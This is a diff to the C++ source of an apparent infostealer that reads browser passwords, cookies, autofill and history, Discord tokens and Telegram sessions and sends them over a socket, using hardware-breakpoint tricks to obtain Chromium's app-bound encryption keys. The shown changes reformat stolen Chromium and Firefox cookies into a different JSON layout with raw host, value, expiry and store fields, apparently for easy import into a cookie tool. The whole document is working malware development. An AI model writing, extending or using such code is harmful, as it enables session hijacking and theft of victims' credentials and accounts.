@@ -17,6 +17,8 @@
 #include <cstdio>
 #include <sstream>
 #include <iomanip>
+#include <ctime>
+#include <cctype>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -124,6 +126,25 @@ std::string path_to_uri(const fs::path& p) {
     return "file:" + encoded + "?mode=ro&nolock=1&immutable=1";
 }
 
+std::string format_timestamp(double ts) {
+    if (ts <= 0) return "";
+    time_t t = (time_t)ts;
+    struct tm tm_buf;
+#ifdef _WIN32
+    gmtime_s(&tm_buf, &t);
+#else
+    gmtime_r(&t, &tm_buf);
+#endif
+    char buf[64];
+    strftime(buf, sizeof(buf), "%d-%m-%Y %H:%M:%S", &tm_buf);
+    return std::string(buf);
+}
+
+std::string to_lower(std::string s) {
+    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return std::tolower(c); });
+    return s;
+}
+
 struct BrowserConfig {
     std::string name;
     std::string process_name;
@@ -153,6 +174,8 @@ void clear_hardware_breakpoints(uint32_t process_id);
 void set_resume_flag(uint32_t thread_id);
 bool extract_key(SOCKET sock, uint32_t thread_id, HANDLE h_process, const BrowserConfig& config, const std::wstring& user_data_dir);
 void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir);
+void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name);
+void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name);
 void extract_discord_tokens(SOCKET sock, const std::wstring& discord_path_w, const std::string& output_name);
 void extract_telegram_session(SOCKET sock);
 
@@ -597,7 +620,7 @@ void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::str
     }
 }
 
-void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
+void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name) {
     fs::path db_path = profile_path / "Network" / "Cookies"; if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return; std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -624,20 +647,34 @@ void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::strin
                     oss_txt << str_name << "=" << cookie_val << ";\n";
                     if (!first) oss_json << ",\n";
 
-                    oss_json << "{\"domain\": \"" << json_escape(str_host) << "\", ";
-                    if (expirationDate > 0) oss_json << "\"expirationDate\": " << std::fixed << std::setprecision(6) << expirationDate << ", ";
-                    oss_json << "\"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ", ";
-                    oss_json << "\"httpOnly\": " << (httponly ? "true" : "false") << ", ";
-                    oss_json << "\"name\": \"" << json_escape(str_name) << "\", ";
-                    oss_json << "\"path\": \"" << json_escape(str_path) << "\", ";
+                    bool hostOnly = (str_host.size() > 0 && str_host[0] != '.');
+                    std::string expires_raw_str;
+                    {
+                        std::ostringstream ss_exp;
+                        ss_exp << std::fixed << std::setprecision(3) << expirationDate;
+                        expires_raw_str = ss_exp.str();
+                        while (!expires_raw_str.empty() && expires_raw_str.back() == '0') expires_raw_str.pop_back();
+                        if (!expires_raw_str.empty() && expires_raw_str.back() == '.') expires_raw_str.pop_back();
+                    }
+
+                    oss_json << "{\n";
+                    oss_json << "	\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(str_host) << "/\",\n";
+                    oss_json << "	\"Name raw\": \"" << json_escape(str_name) << "\",\n";
+                    oss_json << "	\"Path raw\": \"" << json_escape(str_path) << "\",\n";
+                    oss_json << "	\"Content raw\": \"" << json_escape(cookie_val) << "\",\n";
+                    oss_json << "	\"Expires\": \"" << format_timestamp(expirationDate) << "\",\n";
+                    oss_json << "	\"Expires raw\": \"" << expires_raw_str << "\",\n";
+                    oss_json << "	\"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n";
+                    oss_json << "	\"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n";
+                    oss_json << "	\"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n";
                     const char* ss = "unspecified";
                     if (samesite == 0) ss = "no_restriction"; else if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict";
-                    if (samesite == -1) oss_json << "\"sameSite\": null, ";
-                    else oss_json << "\"sameSite\": \"" << ss << "\", ";
-                    oss_json << "\"secure\": " << (secure ? "true" : "false") << ", ";
-                    oss_json << "\"session\": " << (expires_utc == 0 ? "true" : "false") << ", ";
-                    oss_json << "\"storeId\": null, ";
-                    oss_json << "\"value\": \"" << json_escape(cookie_val) << "\"}";
+                    oss_json << "	\"SameSite raw\": \"" << ss << "\",\n";
+                    oss_json << "	\"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n";
+                    oss_json << "	\"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n";
+                    oss_json << "	\"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\",\n";
+                    oss_json << "	\"First Party Domain\": \"\"\n";
+                    oss_json << "}";
                     first = false;
                 }
             }
@@ -762,7 +799,7 @@ void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key,
                 std::string profile_name = entry.path().filename().string();
                 std::string out_prefix = config.output_dir + "/" + profile_name;
                 extract_passwords(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
-                extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
+                extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera, config.name, profile_name);
                 extract_autofill(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
                 extract_history(sock, entry.path(), out_prefix);
             }
@@ -770,7 +807,7 @@ void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key,
     }
 }
 
-void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
+void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name) {
     fs::path db_path = profile_path / "cookies.sqlite"; if (!fs::exists(db_path)) return;
     std::string uri = path_to_uri(db_path); sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
@@ -790,19 +827,35 @@ void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const st
                 oss_txt << str_name << "=" << str_val << ";\n";
                 if (!first) oss_json << ",\n";
 
-                oss_json << "{\"domain\": \"" << json_escape(str_host) << "\", ";
-                if (expiry > 0) oss_json << "\"expirationDate\": " << expiry << ".0, ";
-                oss_json << "\"hostOnly\": " << (str_host.size() > 0 && str_host[0] != '.' ? "true" : "false") << ", ";
-                oss_json << "\"httpOnly\": " << (httponly ? "true" : "false") << ", ";
-                oss_json << "\"name\": \"" << json_escape(str_name) << "\", ";
-                oss_json << "\"path\": \"" << json_escape(str_path) << "\", ";
+                bool hostOnly = (str_host.size() > 0 && str_host[0] != '.');
+                double expirationDate = (double)expiry;
+                std::string expires_raw_str;
+                {
+                    std::ostringstream ss_exp;
+                    ss_exp << std::fixed << std::setprecision(3) << expirationDate;
+                    expires_raw_str = ss_exp.str();
+                    while (!expires_raw_str.empty() && expires_raw_str.back() == '0') expires_raw_str.pop_back();
+                    if (!expires_raw_str.empty() && expires_raw_str.back() == '.') expires_raw_str.pop_back();
+                }
+
+                oss_json << "{\n";
+                oss_json << "	\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(str_host) << "/\",\n";
+                oss_json << "	\"Name raw\": \"" << json_escape(str_name) << "\",\n";
+                oss_json << "	\"Path raw\": \"" << json_escape(str_path) << "\",\n";
+                oss_json << "	\"Content raw\": \"" << json_escape(str_val) << "\",\n";
+                oss_json << "	\"Expires\": \"" << format_timestamp(expirationDate) << "\",\n";
+                oss_json << "	\"Expires raw\": \"" << expires_raw_str << "\",\n";
+                oss_json << "	\"Send for\": \"" << (secure ? "Encrypted connections only" : "Any type of connection") << "\",\n";
+                oss_json << "	\"Send for raw\": \"" << (secure ? "true" : "false") << "\",\n";
+                oss_json << "	\"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\",\n";
                 const char* ss = "unspecified";
                 if (samesite == 1) ss = "lax"; else if (samesite == 2) ss = "strict"; else if (samesite == 0) ss = "no_restriction";
-                oss_json << "\"sameSite\": \"" << ss << "\", ";
-                oss_json << "\"secure\": " << (secure ? "true" : "false") << ", ";
-                oss_json << "\"session\": " << (expiry == 0 ? "true" : "false") << ", ";
-                oss_json << "\"storeId\": null, ";
-                oss_json << "\"value\": \"" << json_escape(str_val) << "\"}";
+                oss_json << "	\"SameSite raw\": \"" << ss << "\",\n";
+                oss_json << "	\"This domain only\": \"" << (hostOnly ? "Valid for host only" : "Valid for subdomains") << "\",\n";
+                oss_json << "	\"This domain only raw\": \"" << (hostOnly ? "true" : "false") << "\",\n";
+                oss_json << "	\"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\",\n";
+                oss_json << "	\"First Party Domain\": \"\"\n";
+                oss_json << "}";
                 first = false;
             }
             oss_json << "\n]";
@@ -946,7 +999,7 @@ void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::w
         if (entry.is_directory()) {
             fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                 std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
-                extract_firefox_cookies(sock, profile_path, out_prefix); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
+                extract_firefox_cookies(sock, profile_path, out_prefix, config.name, profile_name); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
                 if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
             }
         }
